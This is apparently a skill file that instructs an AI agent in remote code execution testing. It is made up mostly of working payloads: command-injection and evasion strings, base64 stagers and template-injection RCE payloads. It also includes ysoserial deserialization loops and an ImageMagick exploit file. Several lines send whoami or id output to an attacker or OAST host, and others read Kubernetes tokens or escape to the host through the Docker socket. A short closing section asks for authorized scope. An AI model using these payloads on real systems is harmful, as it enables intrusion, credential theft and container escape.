---
name: vuln-rce
description: "Remote Code Execution testing skill. Tests command injection, template injection RCE, deserialization RCE, SSRF-to-RCE chains, and container escape vectors. Triggers: 'rce', 'remote code execution', 'command injection', 'os command injection', 'code execution', 'shell injection', 'rce exploit', 'execute command'."
---

# Remote Code Execution Testing

Methodology: identify sinks → establish oracle → confirm context → map boundaries → progress to control.

## Phase 1: Identify Execution Sinks

Priority sinks:
- **Command wrappers**: file conversion, image processing, PDF generation, archive extraction
- **Template engines**: Jinja2, Twig, Freemarker, EJS, Pebble, Mako
- **Deserializers**: Java ObjectInputStream, PHP unserialize(), Python pickle, .NET BinaryFormatter
- **Media pipelines**: ImageMagick convert, Ghostscript, ExifTool, ffmpeg, LaTeX
- **Container APIs**: Docker socket, kubectl, Kubernetes API

```bash
# Find command execution parameters
grep -iE "(exec|system|shell|cmd|command|run|process|pipe)" endpoint_params.txt

# File upload endpoints (potential RCE via file processing)
grep -iE "(upload|import|file|document|pdf|image|convert)" endpoints.txt
```

## Phase 2: Time-Based Oracle (Blind Detection)

```bash
# Unix time-based probes
TARGET_PARAM="cmd"

# Semicolon
curl "https://<target>/api/process?$TARGET_PARAM=legitimate;sleep+5"
# Pipe
curl "https://<target>/api/process?$TARGET_PARAM=legitimate|sleep+5"
# Subshell
curl "https://<target>/api/process?$TARGET_PARAM=\$(sleep+5)"
# And
curl "https://<target>/api/process?$TARGET_PARAM=legitimate%26%26sleep+5"

# Windows time-based
curl "https://<target>/api/process?$TARGET_PARAM=legitimate%26timeout+/t+5+%26"
curl "https://<target>/api/process?$TARGET_PARAM=legitimate|ping+-n+5+127.0.0.1"
```

## Phase 3: Out-of-Band Oracle (Preferred — More Reliable)

```bash
# Set up interactsh listener
interactsh-client -server interactsh.com &
OAST_HOST=$(interactsh-client --show-host)

# DNS OOB
curl "https://<target>/api/process?cmd=;nslookup+%24(whoami).$OAST_HOST"
curl "https://<target>/api/process?cmd=\`nslookup+\$(id).$OAST_HOST\`"

# HTTP OOB
curl "https://<target>/api/process?cmd=;curl+http://$OAST_HOST/\$(whoami)"
curl "https://<target>/api/process?cmd=;wget+http://$OAST_HOST/\$(hostname)"
```

## Phase 4: Command Injection Techniques

**Unix delimiter variants:**
```bash
; id
| id
|| id
& id
&& id
`id`
$(id)
${IFS}id    # IFS bypass
{id,}       # Brace expansion
```

**Evasion techniques:**
```bash
# Token splitting (quote insertion)
w'h'o'a'm'i
wh"oam"i

# Variable building
a=id; $a
x=i;y=d;$x$y

# Base64 stager
echo "aWQ=" | base64 -d | bash
bash -c {echo,aWQ=}|{base64,-d}|bash

# Hex encoding
\x69\x64

# Environment variable abuse
${PATH:0:1}id   # / = first char of PATH
```

**Windows-specific:**
```bash
& whoami
| whoami
|| whoami
cmd /c whoami
powershell -c "whoami"
%COMSPEC% /c whoami
```

## Phase 5: Template Injection RCE

```bash
# Math probe (detect template engine first)
curl "https://<target>/api/render?template={{7*7}}"  # Jinja2, Twig → 49
curl "https://<target>/api/render?template=<%=7*7%>" # ERB → 49
curl "https://<target>/api/render?template=${7*7}"   # FreeMarker → 49

# Jinja2 → Python RCE
# {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
curl -G "https://<target>/api/render" \
  --data-urlencode "template={{config.__class__.__init__.__globals__['os'].popen('id').read()}}"

# Twig → PHP RCE
# {{['id']|filter('system')}}
# {{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}

# FreeMarker → Java RCE
# <#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

# ERB (Ruby) → RCE
# <%=`id`%>
```

## Phase 6: Java Deserialization

```bash
# Detect Java serialized objects: magic bytes \xaced\x0005
file upload.bin  # Check: Java serialization data

# Generate payload with ysoserial
java -jar ysoserial.jar CommonsCollections1 "curl http://<attacker>/$(id)" > payload.ser
java -jar ysoserial.jar CommonsCollections6 "nslookup $(whoami).<oast_host>" > payload.ser

# Test via endpoint
curl -X POST "https://<target>/api/deserialize" \
  -H "Content-Type: application/octet-stream" \
  --data-binary @payload.ser

# Gadget chain selection (try in order)
for chain in CommonsCollections1 CommonsCollections2 CommonsCollections3 CommonsCollections4 CommonsCollections5 CommonsCollections6; do
  java -jar ysoserial.jar $chain "curl http://<attacker>/test_$chain" > /tmp/payload_$chain.ser
  curl -s -X POST "https://<target>/api/deserialize" --data-binary @/tmp/payload_$chain.ser
done
```

## Phase 7: ImageMagick / File Processing

```bash
# ImageMagick CVE-2016-3714 (ShellShock-style)
cat > exploit.mvg << 'EOF'
push graphic-context
viewbox 0 0 640 480
fill 'url(https://evil.com/image.jpg"|curl http://<attacker>/$(id)|")'
pop graphic-context
EOF
curl -F "file=@exploit.mvg" "https://<target>/api/convert"

# Ghostscript PostScript injection
cat > exploit.ps << 'EOF'
%!PS
({id} run)
EOF
curl -F "file=@exploit.ps" "https://<target>/api/pdf/convert"
```

## Phase 8: Container Escape (Post-RCE)

```bash
# Check if inside container
cat /.dockerenv
cat /proc/1/cgroup | grep -i docker

# Kubernetes service account token
cat /var/run/secrets/kubernetes.io/serviceaccount/token
curl -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" \
  https://kubernetes.default.svc/api/v1/pods

# Docker socket escape
ls -la /var/run/docker.sock
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it alpine chroot /mnt sh

# Check privileged mode
cat /proc/self/status | grep CapEff
# CapEff: 0000003fffffffff = full capabilities = privileged
```

## Validation (REQUIRED before reporting)

Confidence threshold ≥0.70 required. Three criteria:
1. **Causality**: minimal, reliable oracle proving actual code execution (not simulated output)
2. **Reproducibility**: exact request + parameters that trigger execution
3. **Impact**: context confirmed — `uid`, working directory, `hostname`; persistence/escalation path shown

Avoid simulated outputs — confirm actual command execution. Use non-destructive commands (`id`, `whoami`, `hostname`, `cat /etc/os-release`). Do NOT `rm -rf`, modify production data, or install persistent access without explicit scope authorization.
